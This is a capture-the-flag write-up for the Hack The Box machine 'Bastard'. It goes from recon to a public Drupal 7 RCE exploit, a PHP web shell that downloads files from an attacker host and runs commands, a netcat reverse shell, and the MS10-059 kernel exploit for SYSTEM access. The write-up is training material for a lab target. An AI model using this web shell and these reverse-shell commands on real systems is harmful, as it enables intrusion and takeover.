# Bastard [htb](https://app.hackthebox.com/machines/Bastard)
![bastard-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/bastard-01.png)



## Recon


Lets add the target to our `/etc/hosts` file:

![hosts-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/hosts-02.png)


Now we can scan the target with: 

`nmap -sC -sV -A -p- bastard.htb -oN nmap.result`

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/nmap-res-03.png)


We have the following:

+ An IIS v7.5 server on port 80.
  
Seems like the `robots.txt` has some interesting directories. 

+ RPC on ports 135, 49154. 


Lets check the website. 


### HTTP 80

If we open our browsers and navigate towards `http://bastard.htb/`: 

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/site-04.png)

We see a login page, Iv'e tried SQLi, didnt really work for me. Creating an account doenst work, and the password reset feature doesnt work as well.  

If we take a look at the `robots.txt` file nmap found:

![robots-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/robots-05.png)


This `CHANGELOG.txt` file must be containing version numbers. 

![changelog-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/changelog-06.png)


We can see the backend is `Drupal 7.54`. If we use look up vulnerabilities:

`searchsploit drupal 7`

![searchsploit-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/searchsploit-06.png)


There's no shortage, Lets try the highlighted rce exploit. Copy it over with:

`cp /usr/share/exploitdb/exploits/php/webapps/41564.php rce.php`

Once you have the file in your current directory, open it:

![php-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/php-08.png)

Looks like the script is searching for an endpoint in `rest_endpoint`. Lets see if we have this directory:

`http://bastard.htb/rest_endpoint`
 
![endpoint-fail-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/endpoint-fail-09.png)

We dont, but if we go to `http://bastard.htb/rest`: 

![endpoint-success-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/endpoint-success-10.png)

Now we found the rest endpoint location, which means we can probably wxploit this. We just need to update the directory name in the exploit:

![update-exploit-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/update-exploit-11.png)

I updated the endpoint path, filename, and the URL of our target. I also added some php code so we can
upload files and execute commands.

```php
<?php
        if (isset($_REQUEST['fupload'])) {
                file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.20/" . $_REQUEST['fupload']));

        };

        if (isset($_REQUEST['fexec'])) {
                echo "<pre>".shell_exec($_REQUEST['fexec'])."</pre>";

        };

?>
```
 

To run this, you might need to install curl-php with `apt install php-curl`. 

Then we can run the exploit with: 

`php rcp.php`

![execute-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/execute-12.png)


Now that the file has been uploaded, we can execute commands via the URL:

`http://bastard.htb/shell.php?fexec=dir`

![rce-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/rce-13.png)


Lets see if we can upload `nc.exe` to the target and get a reverse shell. 

Copy `nc.exe` to your working directory: 

`cp /usr/share/windows-resources/binaries/nc.exe .`


Start a python web server:

`python3 -m http.server 80`

Use the file upload feature to put in on the target: 

`http://bastard.htb/shell.php?fupload=nc.exe`


![nc-transfer-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/nc-transfer-14.png)


Looks like the file has been saved on the target. 

Lets start the local listener: 

`nc -lnvp 9001` 


Now we want to execute `nc.exe` with: 

`nc.exe -e cmd.exe 10.10.14.20 9001`

I use Burp to URL-encode this. 

If we send the payload in the URL:

`http://bastard.htb/shell.php?fexec=<payload>`


We get a shell: 

![shell-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/shell-15.png)

Lets try to get system! 

## Privilege Escalation

If we run `systeminfo`:

![sysinfo-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/sysinfo-16.png)

We can see we are up againts a 2008 Windows server. If we take this output, save it to a file on our
Kali machine, and run [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) againts it, we can see the following:

![exploit-suggester-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/exploit-suggester-17.png)

MS10-059 is a well known kernel exploit for Windows as it works more often then not, so its worth a shot. 

You can find the exploit [here](https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059%3A%20Chimichurri/Compiled/Chimichurri.exe), download it to your Kali machine. 

Next, start a python web server with: 

`python3 -m http.server 80`

and use the file upload feature we created before to upload the file to the target: 

`http://bastard.htb/shell.php?fupload=Chimichurri.exe`

![dir-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/dir-18.png)

Setup the netcat listener with:

`nc -lnvp 9002`


Finally, execeute the exploit with:

`Chimichurri.exe 10.10.14.31 9002`

Where the IP is your Kali machine, and `9002` the port your listening on. 


Execute, and this should yield you a shell as the system:

![root-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bastard/img/root-19.png)

